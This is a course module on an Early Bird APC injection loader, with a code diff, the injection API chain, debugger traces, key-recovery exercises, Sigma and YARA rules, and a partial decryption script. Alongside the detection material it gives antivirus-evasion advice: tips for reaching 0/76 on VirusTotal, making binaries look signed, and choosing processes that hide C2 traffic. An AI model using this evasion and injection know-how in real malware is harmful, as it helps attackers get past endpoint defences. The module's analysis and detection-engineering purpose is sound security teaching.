# Stage 06: Early Bird APC Injection with Remote-Side Decryption (Variant B) — Learning Path

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Early Bird APC Injection — Target Variation & Reinforcement |
| **Level** | Intermediate-Advanced |
| **Estimated Time** | 4-5 hours |
| **Category** | Windows Internals / Injection / Cryptanalysis / Detection Engineering |
| **Platform** | Windows x64 |
| **Binary** | `earlybird-apc.exe` (~268KB, Rust, PE64) |
| **Prerequisites** | Stage 05 (APC injection with remote-side decryption) |
| **VT Score** | **0/76 → 1/76** (achieved 0/76 on 2026-03-11, decayed to 1/76 by 2026-03-17) |

### VT Detection Journey

```
 ██████████████████████████████████████ 0/76  ← ACHIEVED (March 11, 2026)
 █████████████████████████████████████░ 1/76  ← CURRENT  (March 17, 2026)
                                               ESET Agent.ION (sample-burned)

 Only ESET detects this variant. CrowdStrike and Elastic — which flagged Stage 05
 (3/76) — do NOT flag Stage 06. Same injection technique, same APIs in IAT,
 but different binary fingerprint.

 This demonstrates VARIANT EVASION: two binaries using identical techniques
 produce different VT scores because ML classifiers match on aggregate binary
 features (size, byte distribution, string content), not just API combinations.
 Stage 06 is 268KB vs Stage 05's 279KB — the size difference alone may push
 CrowdStrike below its confidence threshold.

 CONFIRMED: earlybird-apc.exe was the FIRST Goodboy binary verified at 0/76
 (hash da82a12f..., March 11, 2026 — before the direct-syscalls binary).
```

---

## Why This Stage Exists — The Bridge from Stage 05

Stage 06 is not a new technique — it's a **variant** of Stage 05. Both use the same `inject_with_decoder()` function, same triple encryption, same decoder stub, same KUSER_SHARED_DATA check. Only the keys and target differ.

**Why does a variant deserve its own stage?**

Because in the real world, malware families are analyzed as COLLECTIONS. A SOC analyst who encounters both Stage 05 and Stage 06 must answer:
- "Is this the same threat actor?" (Yes — same architecture)
- "Is my Stage 05 detection catching Stage 06?" (Only if it targets technique invariants, not per-variant data)
- "What's the blast radius?" (If two variants exist, assume more are coming)

**The educational value**: Stages 05-06 together teach **variant analysis** — the skill of identifying shared code patterns across different binaries in the same family. This is a core competency for threat intelligence analysts, SOC operators, and detection engineers.

**What changes at Stage 07**: The injection API layer is completely replaced. Instead of importing CreateProcessW/VirtualAllocEx/QueueUserAPC via IAT, Stage 07 issues **direct syscalls** — bypassing both the IAT and ntdll.dll entirely. Every detection rule you've written targeting import tables or function hooks becomes useless.

### Real-World Context (2025-2026)

Variant families are the norm, not the exception:
- **BlackCat/ALPHV** (2022-2024) — Deployed hundreds of Rust variants with different encryption keys, target paths, and C2 addresses. Same architecture, different parameters
- **LockBit** (2023-2025) — Builder tool generates unlimited variants from a template. Each affiliate gets a unique build
- **Cobalt Strike malleable profiles** — A single framework produces operationally unique binaries per engagement

The skill of recognizing "same technique, different keys" across variants is what separates junior analysts from senior threat intelligence professionals.

---

## Prerequisites

Before starting this module, you should be comfortable with:
- Early Bird APC injection fundamentals from Stage 05 (CreateProcessW → QueueUserAPC → ResumeThread)
- Triple-layer encryption (position mask → AES → remote-side XOR) from Stage 05
- The 41-byte position-independent XOR decoder stub from Stage 05
- `KUSER_SHARED_DATA` anti-sandbox technique from Stage 05
- RWX memory requirement for in-place decryption stubs

**Software needed**:
- Ghidra 11.x or IDA Free/Pro
- x64dbg + ScyllaHide plugin
- Process Monitor (Sysinternals)
- Python 3.10+

---

## Learning Objectives

By the end of this module, you will be able to:

1. **Compare** injection target choices (notepad.exe vs charmap.exe vs svchost.exe) and explain the detection trade-offs of each
2. **Verify** that the same injection architecture (triple encryption + decoder stub) works across different targets and key sets
3. **Perform** a known-plaintext attack against the XOR layer using a different intermediate byte (`0x63` vs Stage 05's `0x38`)
4. **Recognize** architectural patterns that are reused across malware variants (same technique, different keys/targets)
5. **Explain** why malware authors create multiple variants with different targets — operational flexibility, detection spread, C2 diversity
6. **Write** detection rules that catch the technique regardless of which target process is chosen

---

## Section 0: Source Code Deep Dive — Spot the Differences

Stage 06's source is 76 lines — identical in structure to Stage 05. The learning is in the DIFF, not the code itself.

### Annotated Diff: Stage 05 vs Stage 06

```diff
 #![windows_subsystem = "windows"]

 use common::crypto::aes;
 use common::injection::apc;

-const AES_KEY: [u8; 32] = [
-    0xb7, 0x3a, 0x91, 0xd4, 0x58, 0xf2, 0x0e, 0x6c,
-    ...
-];
+const AES_KEY: [u8; 32] = [
+    0xe4, 0x2b, 0x87, 0x59, 0xc3, 0xf1, 0x6a, 0x0d,
+    ...                           // ← DIFFERENT key. Changes ALL encrypted output.
+];

-// AES decrypt yields XOR'd intermediate (0x38)
-const MASKED_SHELLCODE: &[u8] = &[ 0x59, 0x8c, 0x48, ... ];
+// AES decrypt yields XOR'd intermediate (0x63)
+const MASKED_SHELLCODE: &[u8] = &[ 0xed, 0x1a, 0xce, ... ];
+// ^^^ Completely different 318 bytes. Same plaintext shellcode underneath,
+// but triple encryption with different keys = zero byte overlap.

 // demask() is IDENTICAL — same constants (0x37, 0x5A)
 fn demask(data: &[u8]) -> Vec<u8> { ... }

 fn main() {
     if !common::benign::preflight() { return; }

     let ok = unsafe {
         core::ptr::read_volatile(0x7FFE0320usize as *const i64) > 300_000
     };
     if !ok { return; }
     // ^^^ Same KUSER_SHARED_DATA check, same threshold

     unsafe {
         let ciphertext = demask(MASKED_SHELLCODE);
         let intermediate = match aes::decrypt(&ciphertext, &AES_KEY) { ... };

-        let k: [u8; 16] = [ 0xd1, 0x7b, 0xe3, 0x4c, ... ];
+        let k: [u8; 16] = [ 0x8a, 0x3e, 0xf7, 0x51, ... ];
+        // ^^^ Different INNER_KEY. intermediate[0] XOR key[0] = 0x63 ^ 0x8A = 0xE9

-        let target = "C:\\Windows\\System32\\charmap.exe";
+        let target = "C:\\Windows\\System32\\notepad.exe";
+        // ^^^ Different target. Plain string literal (no obf! — avoids CrowdStrike ML)

         let _ = apc::inject_with_decoder(&intermediate, &k, Some(&target));
         // ^^^ SAME function call. The injection architecture is identical.
     }
 }
```

### What This Diff Teaches

**For attackers**: Generating a new variant takes ~5 minutes:
1. Generate new AES key: `secrets.token_bytes(32)`
2. Generate new inner key: `secrets.token_bytes(16)`
3. Re-encrypt shellcode with new keys
4. Change target path string
5. Compile → new binary with zero byte overlap with previous variant

**For defenders**: Content-based signatures are useless across variants. The 4 invariants that catch ALL variants:
1. `demask()` constants: `0x37` (multiplier) and `0x5A` (addend)
2. Decoder stub bytes: 41-byte PIC sequence (identical across all variants)
3. `KUSER_SHARED_DATA` read: `0x7FFE0320` address constant
4. `inject_with_decoder()` API call sequence: CreateProcessW → VirtualAllocEx → WriteProcessMemory → VirtualProtectEx → QueueUserAPC → ResumeThread

### Execution Flow — Complete

```
earlybird-apc.exe
  │
  ├── benign::preflight()                    ← Gate 1: HashMap, BTreeMap, fs ops
  │
  ├── KUSER_SHARED_DATA uptime > 300,000?    ← Gate 2: anti-sandbox
  │
  ├── demask(MASKED_SHELLCODE)               ← Layer 1: remove position mask
  │   └── 318 bytes → 318 bytes (same size, different content)
  │
  ├── aes::decrypt(&ciphertext, &AES_KEY)    ← Layer 2: RC4 decrypt
  │   └── 318 bytes → 302 bytes (envelope removed: nonce + integrity)
  │   └── intermediate[0] = 0x63 (NOT 0xE9 — still XOR'd)
  │
  └── apc::inject_with_decoder(&intermediate, &k, Some("notepad.exe"))
      │
      ├── CreateProcessW("notepad.exe", CREATE_SUSPENDED)
      │   └── notepad.exe spawns frozen — main thread never starts
      │
      ├── Build payload: [stub(41) + key(16) + intermediate(302)] = 359 bytes
      │
      ├── VirtualAllocEx(notepad, 359, RW)
      ├── WriteProcessMemory(notepad, payload)
      ├── VirtualProtectEx(notepad, RWX)
      │   └── ⚠ PAGE_EXECUTE_READWRITE (0x40) — detection signal
      │
      ├── QueueUserAPC(stub_address, suspended_thread)
      │   └── Stub queued — will execute when thread resumes
      │
      └── ResumeThread(suspended_thread)
          └── Thread wakes → processes APC queue → stub runs:
              1. XOR decrypt intermediate in-place (key[i%16])
              2. JMP to decrypted shellcode
              3. MessageBox("GoodBoy", "OK") appears ← PROOF
```

---

## Section 0B: Dynamic Analysis — Tracing the Injection Live

### Exercise 0B.1: Watch the Cross-Process Injection in x64dbg (20 min)

**Goal**: Observe the injection chain in real-time, including the moment data appears inside notepad.exe.

**Setup**:
1. Open `earlybird-apc.exe` in x64dbg (ScyllaHide enabled)
2. Let `benign::preflight()` and the uptime check pass (ensure VM uptime > 5 min)

**Step 1: Catch CreateProcessW**
```
bp CreateProcessW
```
When hit, examine arguments:
- `lpApplicationName` → points to wide string `"C:\Windows\System32\notepad.exe"`
- `dwCreationFlags` → `0x00000004` (CREATE_SUSPENDED)

Press `Ctrl+F9` (run to return). Check `PROCESS_INFORMATION`:
- `hProcess` → handle to notepad.exe
- `hThread` → handle to the suspended thread
- `dwProcessId` → PID of notepad.exe (note this for later)

**Step 2: Catch VirtualAllocEx**
```
bp VirtualAllocEx
```
When hit:
- `hProcess` → same handle as Step 1
- `dwSize` → `0x167` (359 bytes = 41 + 16 + 302)
- `flProtect` → `0x04` (PAGE_READWRITE)

After return, record the allocated address in notepad's memory.

**Step 3: Catch WriteProcessMemory**
```
bp WriteProcessMemory
```
When hit, examine `lpBuffer` — this contains the combined `[stub + key + intermediate]`:
- Bytes 0-40: Decoder stub (`48 8D 3D 22 00 00 00 48 8D 35 ...`)
- Bytes 41-56: INNER_KEY (`0x8A 0x3E 0xF7 0x51 ...`)
- Bytes 57-358: XOR'd intermediate (first byte `0x63`, NOT `0xE9`)

**Step 4: Catch VirtualProtectEx → RWX**
```
bp VirtualProtectEx
```
When hit:
- `flNewProtect` → `0x40` (PAGE_EXECUTE_READWRITE) ⚠ Detection signal

**Step 5: Observe the APC Queue + Resume**
```
bp QueueUserAPC
bp ResumeThread
```
After `ResumeThread` returns, notepad.exe's suspended thread wakes up. It processes the APC → the stub executes → XOR decrypts → shellcode runs → MessageBox("GoodBoy") appears.

**Step 6: Verify in notepad.exe**
Open a SECOND x64dbg instance, attach to notepad.exe (use the PID from Step 1):
- Navigate to the allocated address from Step 2
- You should see the decrypted shellcode (starts with `0xE9`) in RWX memory
- The stub has already run and overwritten the intermediate with plaintext

### Exercise 0B.2: Process Monitor Correlation (10 min)

**Goal**: See what Sysmon/ProcMon captures during the injection.

Run Process Monitor with these filters:
- Process Name = `earlybird-apc.exe` or `notepad.exe`
- Operation = Process Create, Thread Create, or contains `Virtual`

**Expected events**:
```
Time       Process              Operation         Detail
─────────  ───────────────────  ────────────────  ──────────────────────────
00:00.000  earlybird-apc.exe    Process Start     PID=1234
00:00.050  earlybird-apc.exe    Process Create    notepad.exe PID=5678 (SUSPENDED)
00:00.051  earlybird-apc.exe    WriteProcessMem   5678: 359 bytes at 0x...
00:00.052  earlybird-apc.exe    VirtualProtectEx  5678: RW→RWX at 0x...
00:00.053  earlybird-apc.exe    Resume Thread     TID=9012 in PID=5678
00:00.054  notepad.exe          (APC fires)       Stub decrypts + executes
00:00.100  earlybird-apc.exe    Process Exit      Clean exit
```

**Key observation**: No CreateRemoteThread event. No Sysmon Event 8. The APC is invisible to standard Sysmon configuration. Detection requires the parent-child relationship (Event 1) or ETW kernel providers.

---

## Section 1: Theory — Why Multiple Variants?

### Malware Variant Strategy

Professional malware operators don't use a single binary. They create **variant families** — binaries that share the same architecture but differ in:

| Property | Stage 05 | Stage 06 |
|----------|----------|----------|
| **Target process** | `charmap.exe` | `notepad.exe` |
| **AES key** | `0xb7, 0x3a, 0x91, 0xd4, ...` | `0xe4, 0x2b, 0x87, 0x59, ...` |
| **INNER_KEY (XOR)** | `0xd1, 0x7b, 0xe3, 0x4c, ...` | `0x8a, 0x3e, 0xf7, 0x51, ...` |
| **Intermediate first byte** | `0x38` | `0x63` |
| **Injection function** | `inject_with_decoder()` | `inject_with_decoder()` |
| **Encryption layers** | 3 (mask + AES + XOR) | 3 (mask + AES + XOR) |
| **Memory protection** | RWX (0x40) | RWX (0x40) |
| **Anti-sandbox** | KUSER_SHARED_DATA | KUSER_SHARED_DATA |
| **Decoder stub** | 41-byte XOR stub | 41-byte XOR stub |

**Why?**:
1. **Detection spread**: If one variant burns (gets signatured), the other still works with different keys and a different target
2. **Operational flexibility**: Different targets for different environments — notepad.exe for user workstations, charmap.exe for servers
3. **Signature diversity**: Different encrypted blobs, different target strings — each variant has a unique file hash
4. **C2 diversity**: Different targets exhibit different baseline behavior, complicating behavioral analysis

### Exercise 1.1: Signature Evasion Analysis

**Question**: An AV vendor creates a signature for Stage 05's `MASKED_SHELLCODE` blob (the first 16 bytes). Does this signature detect Stage 06?

<details>
<summary>Answer</summary>

**No.** Stage 06 uses:
1. A **different AES key** — so the AES ciphertext is entirely different
2. A **different INNER_KEY** — so the pre-AES intermediate is different
3. The **position mask** (`demask()`) is applied to different ciphertext

Even though the underlying shellcode is the same 302 bytes, the triple encryption with different keys produces a completely different 318-byte `MASKED_SHELLCODE` blob. The position mask further scrambles the byte distribution.

This is precisely why malware families use **per-variant keys** — a content-based signature on the encrypted blob is variant-specific. To catch all variants, the AV vendor must:
1. Signature the decrypted shellcode (requires emulation/sandbox)
2. Signature the `demask()` algorithm pattern (catches the technique, not the payload)
3. Signature the decoder stub bytes (41-byte stub is identical across variants)
4. Use behavioral detection (process creation + APC patterns)

Option 3 is actually the most effective static approach — the decoder stub is the same across both variants.
</details>

---

## Section 2: Target Selection — notepad.exe vs charmap.exe

### Why notepad.exe?

Stage 06 injects into `notepad.exe`:

```rust
let target = "C:\\Windows\\System32\\notepad.exe";
let _ = apc::inject_with_decoder(&intermediate, &k, Some(&target));
```

The target path is a **plain string literal** — no `obf!()` macro obfuscation. This is intentional: the `obf!()` macro generates a runtime XOR decryption loop that triggers CrowdStrike's ML classifier at ~60% confidence. Plain string literals avoid this.

### Target Comparison Table

| Target | notepad.exe (Stage 06) | charmap.exe (Stage 05) | svchost.exe |
|--------|----------------------|----------------------|-------------|
| **Always present?** | Yes (every Windows) | Yes (every Windows) | Yes (every Windows) |
| **Commonly running?** | Often | Rarely | Always (many instances) |
| **Expected network?** | No | No | Yes (Windows Update, etc.) |
| **GUI application?** | Yes | Yes | Usually hidden |
| **Elevation required?** | No | No | Sometimes (SYSTEM) |
| **PPL protected?** | No | No | Sometimes |
| **User suspicion** | May notice window | May notice window | Hidden from user |
| **Parent analysis** | Normally started by explorer.exe or cmd.exe | Normally started by explorer.exe | Must come from services.exe |
| **C2 viability** | Low (no expected network) | Low (no expected network) | High (network expected) |

### Exercise 2.1: Target Selection for C2

**Question**: If this binary were a real C2 agent that needs to make outbound HTTPS connections, why would notepad.exe and charmap.exe be poor choices? What would be better?

<details>
<summary>Answer</summary>

**Poor choices** (notepad.exe / charmap.exe):
- Neither application is expected to make network connections
- Any outbound traffic from these processes is an immediate anomaly
- EDR behavioral rules flag network connections from desktop utilities
- These are "dead giveaway" targets for network-level detection

**Better choices for C2**:
1. **svchost.exe**: Legitimately makes HTTPS connections for Windows Update, BITS, etc. — C2 traffic blends in
2. **RuntimeBroker.exe**: UWP apps use this for network access — some outbound traffic is expected
3. **backgroundTaskHost.exe**: Background tasks with network access
4. **msedge.exe** / **chrome.exe**: Browser processes — constant HTTPS traffic is normal

**However**, Stages 05-06 are teaching the **injection technique**, not building a production C2. The target choice prioritizes:
1. Simplicity (no elevation needed)
2. Universal availability
3. Stability (simple processes are less likely to crash)
4. Educational clarity (easy to verify injection worked)
</details>

---

## Section 3: Architectural Identity — Same Pattern, Different Keys

### Code Comparison

Both Stage 05 and Stage 06 follow identical architectural patterns:

```
main()
├── benign::preflight()                    ← both crates
├── KUSER_SHARED_DATA uptime check         ← both crates
│   └── read_volatile(0x7FFE0320) > 300_000
├── demask(MASKED_SHELLCODE)               ← both crates, same algorithm
│   └── b ^ ((i * 0x37 + 0x5A) & 0xFF)
├── aes::decrypt(&ciphertext, &AES_KEY)    ← both crates, different keys
│   └── → intermediate (XOR'd, NOT shellcode)
└── apc::inject_with_decoder(              ← both crates, same function
        &intermediate,
        &INNER_KEY,                        ← different 16-byte key
        Some(&target))                     ← different target path
```

### What's Identical

| Component | Implementation |
|-----------|---------------|
| Position mask | `demask()`: `b ^ ((i * 0x37 + 0x5A) & 0xFF)` |
| AES decryption | `aes::decrypt()` (RC4-based stream cipher) |
| Injection function | `apc::inject_with_decoder()` |
| Decoder stub | 41-byte x86_64 PIC, RIP-relative LEA |
| Memory protection | RW → RWX (0x40) |
| Payload layout | `[stub(41) + key(16) + intermediate(302)] = 359 bytes` |
| Anti-sandbox | `KUSER_SHARED_DATA.TickCountQuad > 300,000` |
| Benign code | `common::benign::preflight()` |

### What's Different

| Component | Stage 05 | Stage 06 |
|-----------|----------|----------|
| AES_KEY | `0xb7, 0x3a, 0x91, 0xd4, ...` | `0xe4, 0x2b, 0x87, 0x59, ...` |
| INNER_KEY | `0xd1, 0x7b, 0xe3, 0x4c, ...` | `0x8a, 0x3e, 0xf7, 0x51, ...` |
| MASKED_SHELLCODE | Different 318-byte blob | Different 318-byte blob |
| Intermediate byte 0 | `0x38` | `0x63` |
| Target process | `charmap.exe` | `notepad.exe` |

### Exercise 3.1: Pattern Recognition

**Question**: An analyst has fully reversed Stage 05 and documented the `demask()` → `aes::decrypt()` → `inject_with_decoder()` pipeline. They encounter Stage 06 for the first time. How quickly can they reverse it, and what steps can they skip?

<details>
<summary>Answer</summary>

**Very quickly** — perhaps 15-20 minutes instead of 2+ hours:

**Steps they can skip entirely**:
1. Understanding the injection technique (identical APC chain)
2. Reversing the decoder stub (same 41-byte stub)
3. Understanding the position mask algorithm (same `demask()`)
4. Understanding the AES/RC4 algorithm (same `aes::decrypt()`)
5. Understanding the anti-sandbox check (same KUSER_SHARED_DATA read)

**Steps they still need**:
1. Extract the new AES_KEY (32 bytes from `.rdata`)
2. Extract the new INNER_KEY (16 bytes from stack/local variables)
3. Extract the new MASKED_SHELLCODE blob (318 bytes from `.rdata`)
4. Note the different target process (notepad.exe vs charmap.exe)
5. Run their existing decryption script with the new keys

**Key insight**: This is why signature-based detection is fragile against variant families — the detection logic must target the **technique** (demask → AES → stub pattern), not the **specific keys/blobs** (which change per variant).

This is also why defenders build **YARA rules that match the decoder stub bytes** or the `demask()` multiplication constant `0x37` — these are invariant across variants.
</details>

---

## Section 4: Known-Plaintext Attack — Different Intermediate Byte

### The XOR Key Recovery

Stage 06's intermediate starts with `0x63` (vs Stage 05's `0x38`). The comment in the source confirms this:

```rust
// Double-encrypted + position-masked, 318 bytes
// AES decrypt yields XOR'd intermediate (0x63), NOT shellcode (0xe9)
```

### Exercise 4.1: Recover INNER_KEY[0]

**Question**: Given that the intermediate's first byte is `0x63` and the shellcode likely starts with `0xE9` (near JMP), recover the first byte of Stage 06's `INNER_KEY`.

<details>
<summary>Answer</summary>

```
intermediate[0] XOR INNER_KEY[0] = shellcode[0]
0x63 XOR INNER_KEY[0] = 0xE9
INNER_KEY[0] = 0x63 XOR 0xE9 = 0x8A
```

Check: Stage 06's `INNER_KEY[0]` is indeed `0x8A`:
```rust
let k: [u8; 16] = [
    0x8a, 0x3e, 0xf7, 0x51, ...  // ← 0x8A confirmed
];
```

**Cross-reference with Stage 05**:
```
Stage 05: 0x38 XOR 0xD1 = 0xE9 ✓
Stage 06: 0x63 XOR 0x8A = 0xE9 ✓
```

Both intermediates XOR with their respective keys to produce `0xE9` — confirming both crates use the same underlying shellcode (starting with a near JMP instruction).
</details>

### Exercise 4.2: Full Key Recovery via Known Plaintext

**Question**: If you know the first 16 bytes of the shellcode (a common prologue), can you recover the entire `INNER_KEY` from just the intermediate?

<details>
<summary>Answer</summary>

**Yes.** Since the XOR key is 16 bytes and repeats cyclically (`key[i % 16]`), knowing 16 consecutive plaintext bytes recovers the entire key:

```python
# Assume known shellcode prologue (first 16 bytes)
known_shellcode = bytes([0xE9, ...])  # 16 bytes

# intermediate extracted from AES decryption
intermediate = bytes([0x63, ...])     # first 16 bytes

# Recover key
inner_key = bytes(intermediate[i] ^ known_shellcode[i] for i in range(16))
```

With the key recovered, all 302 bytes of shellcode can be decrypted. This demonstrates that the XOR layer provides **obfuscation** (prevents pattern matching), not **cryptographic security** (an analyst with known plaintext can break it trivially).

The real security comes from the AES layer — without the 32-byte AES_KEY, the intermediate cannot be recovered from the MASKED_SHELLCODE blob.
</details>

---

## Section 5: Detection Engineering — Target-Agnostic Rules

### The Problem with Target-Specific Detection

The Sigma rule from Stage 05 detects `charmap.exe` spawned by unusual parents. Stage 06 uses `notepad.exe`. A per-target rule misses variants.

### Target-Agnostic Sigma Rule

```yaml
title: Early Bird APC Injection via Suspended GUI Process
id: b8c4d5e6-f7a8-9012-bcde-stage06earlybird
status: experimental
description: >
  Detects unusual parent processes spawning common Windows GUI utilities
  in suspended state. Covers multiple injection targets used by the
  Goodboy malware family variants.
logsource:
    product: windows
    category: process_creation
detection:
    selection_gui_target:
        Image|endswith:
            - '\notepad.exe'
            - '\charmap.exe'
            - '\mspaint.exe'
            - '\calc.exe'
            - '\write.exe'
            - '\wordpad.exe'
    filter_legitimate_parents:
        ParentImage|endswith:
            - '\explorer.exe'
            - '\cmd.exe'
            - '\powershell.exe'
            - '\conhost.exe'
            - '\RuntimeBroker.exe'
            - '\svchost.exe'
            - '\ShellExperienceHost.exe'
    condition: selection_gui_target and not filter_legitimate_parents
level: high
tags:
    - attack.defense_evasion
    - attack.t1055.004
    - attack.execution
falsepositives:
    - Automation tools launching GUI utilities
    - Custom launchers or accessibility software
    - Software installers that launch notepad to show README files
```

### YARA Rule: Decoder Stub Invariant

The 41-byte decoder stub is identical across both variants. This is the best static detection target:

```yara
rule APC_XOR_Decoder_Stub
{
    meta:
        description = "Detects the 41-byte XOR decoder stub used in Early Bird APC injection"
        author = "Goodboy Course"
        stage = "05-06"
        severity = "critical"
        mitre = "T1055.004"

    strings:
        // RIP-relative LEA + XOR loop pattern
        // lea rdi, [rip+0x22]; lea rsi, [rip+0x2B]; mov ecx, imm32
        $stub_prologue = {
            48 8D 3D 22 00 00 00    // lea rdi, [rip+0x22]
            48 8D 35 ?? 00 00 00    // lea rsi, [rip+??]
            B9 ?? ?? 00 00          // mov ecx, imm32 (payload length)
            31 D2                   // xor edx, edx
        }

        // XOR loop body
        $xor_loop = {
            89 D0                   // mov eax, edx
            83 E0 0F                // and eax, 0x0F (key mod 16)
            0F B6 04 07             // movzx eax, byte [rdi+rax]
            30 04 16                // xor byte [rsi+rdx], al
            FF C2                   // inc edx
            39 CA                   // cmp edx, ecx
            7C EE                   // jl loop
        }

        // Jump to decrypted shellcode
        $jmp_payload = { FF E6 }   // jmp rsi

        // KUSER_SHARED_DATA anti-sandbox
        $kuser = { 20 03 FE 7F }   // 0x7FFE0320

        // Position mask constant (0x37 multiplier)
        $demask_mul = { 37 }

    condition:
        uint16(0) == 0x5A4D and
        ($stub_prologue and $xor_loop and $jmp_payload) and
        $kuser
}
```

### Exercise 5.1: Stub Byte Matching

**Question**: The `$stub_prologue` rule uses wildcards (`??`) for the second LEA displacement and the `mov ecx` immediate. Why can't these be exact values?

<details>
<summary>Answer</summary>

These values change per variant because they encode the payload size:

1. **Second LEA displacement** (`lea rsi, [rip+??]`): This points to the intermediate data at offset `stub_size + key_size`. If the key size or stub size changed, this displacement changes. Currently both variants use `0x2B` (= 0x0E + 0x2B = 0x39 = 57 decimal = 41 + 16), but a variant with a 32-byte key would use `0x3B` instead.

2. **`mov ecx` immediate**: This is the intermediate length (302 in both variants). A variant with a different shellcode size would have a different value here. The `00 00` after the length bytes are always zero because payload sizes are < 65536.

**What IS invariant**:
- The first LEA (`lea rdi, [rip+0x22]`) — the key is always at offset 41 (end of stub)
- The `xor edx, edx` initialization
- The entire XOR loop body (fixed instruction sequence)
- The `jmp rsi` terminator

These invariant bytes form a strong detection signature that catches all variants using this stub.
</details>

---

## Section 6: Evasion Lessons — What NOT to Do

### Lessons Learned from VT Testing

During development, several evasion techniques were tested on Stage 06 and found to be **counterproductive**:

| Technique | Expected Effect | Actual Effect | Lesson |
|-----------|----------------|---------------|--------|
| `obf!("notepad.exe")` | Hide target string | CrowdStrike ML trigger (60% confidence) | Runtime XOR decryption loop is a known malware pattern |
| `iat_pad::pad()` + `ballast::anchor()` | Diversify imports + inflate code | Became the Agent.ION signature | Evasion code can itself be signatured |
| WinExec("calc") shellcode | Prove execution works | ESET Agent_AGen.LEE detection | Well-known PoC shellcode has signatures |
| `opt-level="z"` (size optimization) | Smaller binary | Microsoft Wacatac.B!ml trigger | Small binaries with suspicious patterns flag ML |

### What Works

| Technique | Why It Works |
|-----------|-------------|
| Plain string literals | No decryption loop to flag |
| `opt-level=2` (speed optimization) | Different instruction patterns break ML byte-pattern classifiers |
| Triple encryption with unique keys | Each variant has a unique encrypted blob |
| `common::benign::preflight()` | Math/string/env operations dilute offensive code ratio |
| PE patcher pipeline | Stamps metadata to look like a legitimate signed binary |

### Exercise 6.1: Evasion Trade-offs

**Question**: The `obf!()` macro encrypts strings at compile time and decrypts them at runtime. Why does this trigger ML classifiers even though the purpose is to HIDE suspicious strings?

<details>
<summary>Answer</summary>

The `obf!()` macro generates a pattern like:

```asm
; Typical obf! expansion (simplified):
lea rcx, [encrypted_data]
xor eax, eax
.loop:
    mov bl, [rcx + rax]
    xor bl, key_byte
    mov [output + rax], bl
    inc eax
    cmp eax, length
    jl .loop
```

This is a **runtime XOR decryption loop** — one of the most common patterns in malware. ML classifiers have been trained on millions of samples containing this exact pattern. The classifier doesn't care WHAT string is being decrypted — it flags the decryption loop itself as suspicious.

**Irony**: The `obf!()` macro is designed to hide strings from static analysis, but it creates a dynamic analysis signature (the decryption loop) that ML classifiers detect even without running the binary.

**Solution**: Use plain string literals for non-sensitive strings. The string `"C:\\Windows\\System32\\notepad.exe"` is not inherently suspicious — it's a legitimate system path. Hiding it with `obf!()` creates more suspicion than leaving it visible.
</details>

---

## Section 7: Hands-On Lab — Variant Analysis

### Lab 7.1: Cross-Variant Decryption Script (30 min)

**Goal**: Build a single Python script that decrypts BOTH Stage 05 and Stage 06 payloads, proving architectural identity.

```python
#!/usr/bin/env python3
"""Decrypt both Stage 05 and Stage 06 payloads, proving architectural identity."""
import struct

# ═══════════════════════════════════════════════════
# Step 1: Implement the shared crypto functions
# ═══════════════════════════════════════════════════

def demask(data: bytes) -> bytes:
    """Remove position-dependent XOR mask. Identical for both variants."""
    return bytes(b ^ ((i * 0x37 + 0x5A) & 0xFF) for i, b in enumerate(data))

def rc4_ksa(key: bytes) -> list:
    """RC4 Key Scheduling Algorithm."""
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    return S

def rc4_prga(S: list, length: int) -> bytes:
    """RC4 Pseudo-Random Generation Algorithm."""
    i = j = 0
    out = []
    for _ in range(length):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(S[(S[i] + S[j]) & 0xFF])
    return bytes(out)

def derive_nonce(key: bytes) -> bytes:
    """Derive 12-byte nonce from key using custom FNV-1a variant."""
    seed = 0x14650FB0739D0383
    h = seed
    for b in key:
        h ^= b
        h = (h * 0x100000001B3) & 0xFFFFFFFFFFFFFFFF
    # Extract 12 bytes from 64-bit hash + second round
    nonce = struct.pack('<Q', h)  # 8 bytes
    h2 = h ^ seed
    for b in key[:4]:
        h2 ^= b
        h2 = (h2 * 0x100000001B3) & 0xFFFFFFFFFFFFFFFF
    nonce += struct.pack('<I', h2 & 0xFFFFFFFF)  # 4 more bytes
    return nonce[:12]

def aes_decrypt(ciphertext: bytes, key: bytes) -> bytes:
    """The 'AES' decryption — actually RC4 with custom envelope."""
    nonce = derive_nonce(key)
    # Envelope: nonce(12) || rc4_body(N) || integrity(4)
    if ciphertext[:12] != nonce:
        raise ValueError("Nonce mismatch — wrong key or corrupted data")
    rc4_body = ciphertext[12:-4]
    # RC4 decrypt with key || nonce
    rc4_key = key + nonce  # 32 + 12 = 44 bytes
    S = rc4_ksa(rc4_key)
    keystream = rc4_prga(S, len(rc4_body))
    return bytes(a ^ b for a, b in zip(rc4_body, keystream))

def xor_decrypt(data: bytes, key: bytes) -> bytes:
    """Simple XOR with cycling key."""
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

# ═══════════════════════════════════════════════════
# Step 2: Define per-variant constants
# ═══════════════════════════════════════════════════

VARIANTS = {
    "Stage 05 (charmap.exe)": {
        "aes_key": bytes([0xb7, 0x3a, 0x91, 0xd4, 0x58, 0xf2, 0x0e, 0x6c,
                          0xa5, 0x43, 0x7f, 0xe8, 0x1b, 0xcd, 0x69, 0x30,
                          0x82, 0xf5, 0x47, 0x0a, 0xde, 0x63, 0xb9, 0x14,
                          0x7c, 0xe1, 0x56, 0x2d, 0x93, 0xa8, 0x05, 0x4f]),
        "inner_key": bytes([0xd1, 0x7b, 0xe3, 0x4c, 0x85, 0xf0, 0x29, 0xa6,
                            0x3d, 0x92, 0x58, 0xc7, 0x0e, 0xb4, 0x6f, 0x13]),
        "expected_inter_byte0": 0x38,
        # Extract MASKED_SHELLCODE from the actual binary's .rdata
    },
    "Stage 06 (notepad.exe)": {
        "aes_key": bytes([0xe4, 0x2b, 0x87, 0x59, 0xc3, 0xf1, 0x6a, 0x0d,
                          0x38, 0x95, 0xae, 0x72, 0xd6, 0x4c, 0x1b, 0xf3,
                          0x60, 0x8d, 0x24, 0xb9, 0x07, 0x5e, 0xca, 0x41,
                          0x9f, 0x13, 0x76, 0xe8, 0xa2, 0xdb, 0x35, 0x6c]),
        "inner_key": bytes([0x8a, 0x3e, 0xf7, 0x51, 0xc2, 0x64, 0x0b, 0x9d,
                            0xe5, 0x48, 0x73, 0xb6, 0x2f, 0xd0, 0x19, 0xa4]),
        "expected_inter_byte0": 0x63,
    },
}

